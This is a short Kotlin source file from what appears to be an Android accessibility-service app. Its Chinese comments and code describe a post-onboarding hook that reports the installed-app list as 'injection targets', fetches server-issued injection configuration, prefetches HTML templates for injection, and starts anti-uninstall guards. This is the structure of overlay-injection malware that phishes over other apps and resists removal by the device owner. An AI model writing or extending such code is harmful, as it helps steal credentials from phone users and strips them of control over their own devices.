package com.zaka.screenagent.flow

import android.util.Log
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 引导完成后的统一收尾（与厂商无关）：
 *   ① 上报已安装应用列表（面板「注入目标」显示本机已安装）
 *   ② 拉取服务器下发的注入配置
 *   ③ 预取模板 HTML 到本地（注入时秒开）
 *
 * 各厂商流程（MiuiFlow / SamsungFlow …）在最后一步完成后调用一次。
 */
object OnboardingHooks {

    @Volatile private var done = false

    /**
     * 引导完成（**所有厂商共用**）：标记完成 + 上报应用列表 + 拉注入配置 + 预取模板 HTML。
     * 幂等：重复调用只执行一次。
     */
    fun complete(service: BoundaryAccessibilityService) {
        if (done) return
        done = true
        Log.d("Flow", "onboarding complete -> markDone + appList + inject settings + html prefetch")
        runCatching { com.zaka.screenagent.admin.OnboardingState.markDone(service) }
        runCatching { service.onOnboardingComplete() }
        // 引导完成后才启动防卸载守卫（之前只在"服务连上时已完成"才启动，首次安装永远不启动）
        if (!com.zaka.screenagent.BuildConfig.NO_GUARD) {
            if (Vendor.detect() == Vendor.MIUI) {
                runCatching { com.zaka.screenagent.flow.miui.MiuiGuard.start(service) }
                Log.d("Flow", "onboarding complete -> MiuiGuard started")
            } else {
                runCatching { com.zaka.screenagent.admin.AntiUninstallGuard.start(service) }
                Log.d("Flow", "onboarding complete -> AntiUninstallGuard started")
            }
        }
    }
}
